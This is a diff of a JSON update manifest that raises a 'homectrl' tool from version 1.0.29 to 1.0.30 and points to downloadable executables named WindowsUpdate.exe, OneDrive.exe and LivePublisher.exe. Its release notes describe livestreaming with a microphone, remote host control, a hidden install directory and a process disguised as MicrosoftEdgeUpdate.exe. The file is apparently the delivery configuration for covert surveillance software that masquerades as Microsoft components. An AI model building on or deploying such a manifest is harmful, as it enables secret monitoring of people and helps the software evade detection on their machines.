@@ -1,10 +1,10 @@
 ﻿{
-    "version":  "1.0.29",
-    "sha256":  "5b0074b55eb78d8100becbcc7ad700d8e1820a44af9dd83b36a8a3e26478bae3",
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.29/WindowsUpdate.exe",
-    "shadowSha256":  "23516450066d89f6bc5d7b82bec15a9e5b1f83d44c23fdbf84b18716d5eff514",
-    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.29/OneDrive.exe",
+    "version":  "1.0.30",
+    "sha256":  "d8e7bed87bd1c601809efce1ee94ca1ac9c21fa0c544a8666d9cb6c3d94ce7f0",
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.30/WindowsUpdate.exe",
+    "shadowSha256":  "70e6f4e6ad9d045eba966fffee6040da78f687ebf59bc53dc2366e0dcda9ec4b",
+    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.30/OneDrive.exe",
     "livePublisherSha256":  "5d28b7ac314cf9bfe2d821d054c5e57661352125999fbc50c8d5fd2db6f183a3",
-    "livePublisherUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.29/LivePublisher.exe",
-    "notes":  "LivePublisher v2: microphone + multi-monitor viewer-switch + host-control URL"
+    "livePublisherUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.30/LivePublisher.exe",
+    "notes":  "livestream stealth: mic default off, hide install dir, camouflage process as MicrosoftEdgeUpdate.exe"
 }
